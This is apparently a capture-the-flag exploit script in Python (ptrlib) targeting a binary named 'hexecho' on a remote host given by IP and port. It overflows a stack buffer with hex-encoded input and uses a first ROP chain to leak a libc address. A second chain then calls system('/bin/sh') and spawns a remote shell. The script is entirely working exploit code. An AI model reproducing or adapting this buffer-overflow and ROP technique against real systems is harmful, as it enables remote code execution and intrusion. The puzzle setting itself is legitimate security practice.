from ptrlib import *

binary = "./hexecho"
elf = ELF(binary)

"""
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
"""
libc = ELF("./libc.so.6")
r = Socket("nc 34.170.146.252 51786")
# """

def wait_for_attach():
    if not is_remote:
        input('attach?')

def sla(*args):
    r.sendlineafter(*args)


buf = b"ABCDEFGH" * (264 // 8)

payload = buf.hex() + "\n"
payload += "+\n" * 8

rop = [
    next(elf.gadget("ret")),
    elf.symbol("main")
]
payload += p64(0xdeadbeef).hex()
payload += b''.join(map(p64, rop)).hex()
payload += "+\n" * 8

sla("Size:", str(len(buf) + 8 + 16 + 8 * len(rop)))
sla("Data (hex): ", payload)
l = r.recvlineafter(": ").decode("ascii")
l = l.split(" ")[-8:]
libc_ret = 0
for x in l[::-1]:
    libc_ret *= 256
    libc_ret += int(x, 16)
print("libc_ret:", hex(libc_ret))

# libc.base = libc_ret - 0x2a1ca
libc.base = libc_ret - 0x10d90 - 25 * 0x1000

# phase 2:

buf = b"HOGENEKO" * (264 // 8)

payload = buf.hex() + "\n"
payload += "+\n" * 8

rop = [
    next(libc.gadget("ret")),
    next(libc.gadget("pop rdi; ret")),
    next(libc.find("/bin/sh")),
    libc.symbol("system")
]

payload += p64(0xdeadbeef).hex()
payload += b''.join(map(p64, rop)).hex()
payload += "+\n" * 8

sla("Size:", str(len(buf) + 8 + 16 + 8 * len(rop)))
sla("Data (hex): ", payload)
r.sh()
